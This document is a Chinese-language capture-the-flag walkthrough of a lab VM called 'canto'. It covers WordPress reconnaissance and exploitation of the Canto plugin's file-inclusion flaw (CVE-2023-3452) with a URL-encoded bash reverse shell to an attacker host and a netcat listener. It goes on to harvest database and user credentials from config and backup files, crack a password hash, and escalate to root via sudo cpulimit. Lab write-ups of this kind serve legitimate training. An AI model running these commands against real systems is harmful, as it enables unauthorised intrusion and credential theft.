# 信息收集

主机发现

```aiignore
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 06:19 EDT
Nmap scan report for 192.168.21.5
Host is up (0.00028s latency).
MAC Address: 08:00:27:F1:B1:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.93 seconds
```

端口扫描

```aiignore
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.21.5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 06:20 EDT
Nmap scan report for 192.168.21.5
Host is up (0.00037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:F1:B1:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
```

# 漏洞利用

指纹识别

```aiignore
┌──(kali㉿kali)-[~]
└─$ whatweb http://192.168.21.5/
http://192.168.21.5/ [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.21.5], MetaGenerator[WordPress 7.0], Script[application/json,importmap,module,speculationrules], Title[Canto], UncommonHeaders[link], WordPress[7.0]
```

发现是wordpress，用wpscan扫一下

```aiignore
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.21.5 --api-token  --enumerate vp,vt,u --plugins-detection aggressive --random-user-agent
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.21.5/ [192.168.21.5]
[+] Started: Wed May 27 07:07:31 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.21.5/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.21.5/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.21.5/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.21.5/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 7.0 identified (Latest, released on 2026-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.21.5/index.php/feed/, <generator>https://wordpress.org/?v=7.0</generator>
 |  - http://192.168.21.5/index.php/comments/feed/, <generator>https://wordpress.org/?v=7.0</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.21.5/wp-content/themes/twentytwentyfour/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://192.168.21.5/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 | Style URL: http://192.168.21.5/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.21.5/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'
 [i] Plugin(s) Identified:

[+] canto
 | Location: http://192.168.21.5/wp-content/plugins/canto/
 | Last Updated: 2026-05-07T09:11:00.000Z
 | Readme: http://192.168.21.5/wp-content/plugins/canto/readme.txt
 | [!] The version is out of date, the latest version is 3.1.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.21.5/wp-content/plugins/canto/, status: 200
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: Canto < 3.0.9 - Unauthenticated Blind SSRF
 |     Fixed in: 3.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063
 |      - https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0
 |
 | [!] Title: Canto < 3.0.5 - Unauthenticated Remote File Inclusion
 |     Fixed in: 3.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452
 |
 | [!] Title: Canto < 3.0.7 - Unauthenticated RCE
 |     Fixed in: 3.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096
 |      - https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability
 |
 | [!] Title: Canto < 3.0.9 - Unauthenticated Remote File Inclusion
 |     Fixed in: 3.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95a68ae0-36da-499b-a09d-4c91db8aa338
 |
 | [!] Title: Canto < 3.1.2 - Missing Authorization to Unauthenticated File Upload
 |     Fixed in: 3.1.2
 |     References:
 |      - https://wpscan.com/vulnerability/c189c05f-f00c-41bb-8fac-1f23da22e4fd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-3335
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0777f759-6980-4572-a866-0210bd5f5085
 |
 | [!] Title: Canto <= 3.1.1 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Setting Modification
 |     References:
 |      - https://wpscan.com/vulnerability/cb121deb-0089-4b97-96e0-2abedcf67599
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-6441
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c1a0200f-9861-4eca-adbf-d458eb6b4e63
 |
 | Version: 3.0.4 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.21.5/wp-content/plugins/canto/readme.txt
 | Confirmed By: Composer File (Aggressive Detection)
 |  - http://192.168.21.5/wp-content/plugins/canto/package.json, Match: '3.0.4'
 [i] No themes Found.
 [i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.21.5/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 21

[+] Finished: Wed May 27 07:07:46 2026
[+] Requests Done: 8062
[+] Cached Requests: 11
[+] Data Sent: 2.351 MB
[+] Data Received: 1.4 MB
[+] Memory used: 266.715 MB
[+] Elapsed time: 00:00:15
```

插件扫到很多漏洞，尝试哪个可以利用到

```aiignore
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2023-3452.py -u http://192.168.21.5 -LHOST 192.168.21.7 -c '%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.21.7%2F4444+0%3E%261%27'
Exploitation URL: http://192.168.21.5/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.21.7:8080&cmd=%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.21.7%2F4444+0%3E%261%27
Local web server on port 8080...
192.168.21.5 - - [27/May/2026 07:14:48] "GET /wp-admin/admin.php HTTP/1.1" 200 -
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.5] 46834
bash: cannot set terminal process group (957): Inappropriate ioctl for device
bash: no job control in this shell
www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```aiignore
//配置文件中找到了账号密码
www-data@canto:/var/www/html$ cat wp-config.php
/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', '2NCVjoWVE9iwxPz' );
//登陆数据库里面寻找一下信息
www-data@canto:/var/www/html$ mysql -u wordpress -p
mysql -u wordpress -p
Enter password: 2NCVjoWVE9iwxPz
show databases;
exit
Database
information_schema
performance_schema
wordpress
www-data@canto:/var/www/html$ mysql -u wordpress -p
mysql -u wordpress -p
Enter password: 2NCVjoWVE9iwxPz
use wordpress;
show tables;
exit
Tables_in_wordpress
wp_commentmeta
wp_comments
wp_links
wp_options
wp_postmeta
wp_posts
wp_term_relationships
wp_term_taxonomy
wp_termmeta
wp_terms
wp_usermeta
wp_users
www-data@canto:/var/www/html$ mysql -u wordpress -p
mysql -u wordpress -p
Enter password: 2NCVjoWVE9iwxPz
use wordpress;
select * from wp_users;
exit
ID      user_login      user_pass       user_nicename   user_email  user_url        user_registered user_activation_keyuser_status      display_name
1       erik    $P$BZk2jE4XrC91HKgRS83h0gICjM0bcB.      eriktest@gmail.com  http://192.168.1.36     2024-05-12 11:16:070erik
//破解一下hash
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:07:26 DONE (2026-05-27 07:42) 0g/s 32111p/s 32111c/s 32111C/s !!!@@@!!!..*7¡Vamos!
Session completed.
//没出来，换个路
www-data@canto:/home/erik/notes$ cat Day1.txt
cat Day1.txt
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt
cat Day2.txt
I almost lost the database with my user so I created a backups folder.
//提示backups
www-data@canto:/home/erik/notes$ find / -name backups 2>/dev/null
find / -name backups 2>/dev/null
/snap/core22/1380/var/backups
/snap/core22/864/var/backups
/var/backups
/var/wordpress/backups
www-data@canto:/var/wordpress/backups$ cat 12052024.txt
cat 12052024.txt
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
┌──(kali㉿kali)-[~]
└─$ ssh erik@192.168.21.5
The authenticity of host '192.168.21.5 (192.168.21.5)' can't be established.
ED25519 key fingerprint is SHA256:jRCgzH5SXuNm8Cv3PUWt4FXgI74f7392+2lVl33dL2g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.5' (ED25519) to the list of known hosts.
erik@192.168.21.5's password: 
Welcome to Ubuntu 23.10 (GNU/Linux 6.5.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed May 27 11:59:28 AM UTC 2026

  System load:  0.0               Processes:               112
  Usage of /:   40.8% of 8.02GB   Users logged in:         0
  Memory usage: 21%               IPv4 address for enp0s3: 192.168.21.5
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun May 12 17:19:50 2024 from 192.168.1.163
erik@canto:~$ id
uid=1001(erik) gid=1001(erik) groups=1001(erik)
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
erik@canto:~$ sudo cpulimit -l 100 -f /bin/bash
Process 1710 detected
root@canto:/home/erik# id
uid=0(root) gid=0(root) groups=0(root)
```